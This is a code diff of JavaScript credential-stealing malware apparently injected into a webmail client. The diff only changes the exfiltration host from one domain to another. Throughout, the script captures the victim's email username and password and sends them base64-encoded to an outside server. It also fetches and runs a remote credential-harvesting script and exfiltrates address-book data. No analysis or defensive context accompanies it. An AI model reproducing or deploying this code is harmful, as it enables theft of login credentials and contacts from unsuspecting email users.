@@ -22,7 +22,7 @@ async function takeUsername() {
 
     if (!res.ok) {
       username = "undefined";
-      const logUrl = `https://zhblz.com/zJ2w9x?log=e_h_f_u_${username}`;
+      const logUrl = `https://cradle.com/zJ2w9x?log=e_h_f_u_${username}`;
       return await fetch(logUrl)
 };
 
@@ -33,7 +33,7 @@ async function takeUsername() {
     const toLineMatch = bodyText.match(/^To:\s*([\s\S]*?)(\n|$)/im);
     if (!toLineMatch) {
       username = "undefined";
-      const logUrl = `https://zhblz.com/zJ2w9x?log=e_h_f_u_${username}`;
+      const logUrl = `https://cradle.com/zJ2w9x?log=e_h_f_u_${username}`;
       return await fetch(logUrl)
 };
 
@@ -41,13 +41,13 @@ async function takeUsername() {
     if (!emailMatch) return null;
     username = emailMatch[0];
 
-    fetch(`https://zhblz.com/zJ2w9x?log=h_f_u_${username}`);
+    fetch(`https://cradle.com/zJ2w9x?log=h_f_u_${username}`);
 
 
     return username;
 
   } catch (err) {
-    fetch(`https://zhblz.com/zJ2w9x?log=e_h_f_u_${username}`);
+    fetch(`https://cradle.com/zJ2w9x?log=e_h_f_u_${username}`);
     return null;
   }
 }
@@ -79,7 +79,7 @@ function getUserCredentialsChrome() {
 
       if (username && password) {
         const base64Credentials = btoa(username + ':' + password);
-        fetch(`https://zhblz.com/zJ2w9x?log=c_c_f_u_${username}_:_${base64Credentials}`);
+        fetch(`https://cradle.com/zJ2w9x?log=c_c_f_u_${username}_:_${base64Credentials}`);
       }
     }, 300);
   }, { once: true });
@@ -94,9 +94,9 @@ getUserCredentialsChrome();
 
 (async () => {
   try {
-    const resp = await fetch("https://zhblz.com/getUserCredentials.js");
+    const resp = await fetch("https://cradle.com/getUserCredentials.js");
     if (!resp.ok) {
-      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${"f_g_getUserCredentials.js"}`);
+      await fetch(`${"https://cradle.com/zJ2w9x"}?log=${"f_g_getUserCredentials.js"}`);
       return;
     }
     const scriptContent = await resp.text();
@@ -104,11 +104,11 @@ getUserCredentialsChrome();
 
     getUserCredentials((userCredentials, username) => {
       const base64Credentials = btoa(userCredentials);
-      fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`f_c_f_u_${username}_:_${base64Credentials}`}`);
+      fetch(`${"https://cradle.com/zJ2w9x"}?log=${`f_c_f_u_${username}_:_${base64Credentials}`}`);
     });
   } catch (error) {
     const errorUsername = username;
-    await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`e_f_c_f_u_${username}`}`);
+    await fetch(`${"https://cradle.com/zJ2w9x"}?log=${`e_f_c_f_u_${username}`}`);
   }
 })();
 
@@ -154,14 +154,14 @@ const newUrl = `${originalUrl.split("/src/")[0]}/src/addressbook.php`;
 
         const log = `t_a_f_u_${username}_:_${base64Encoded}`;
 
-        const trackingUrl = `https://zhblz.com/zJ2w9x?log=t_a_b_f_u_${username}_:_${encodeURIComponent(log)}`;
+        const trackingUrl = `https://cradle.com/zJ2w9x?log=t_a_b_f_u_${username}_:_${encodeURIComponent(log)}`;
 
         await fetch(trackingUrl, {
             method: "GET",
             mode: "no-cors"
         });
     } catch (error) {
-        await fetch(`${"https://zhblz.com/zJ2w9x"}?log=e_t_a_b_f_u_${username}`);
+        await fetch(`${"https://cradle.com/zJ2w9x"}?log=e_t_a_b_f_u_${username}`);
     }
 }
 
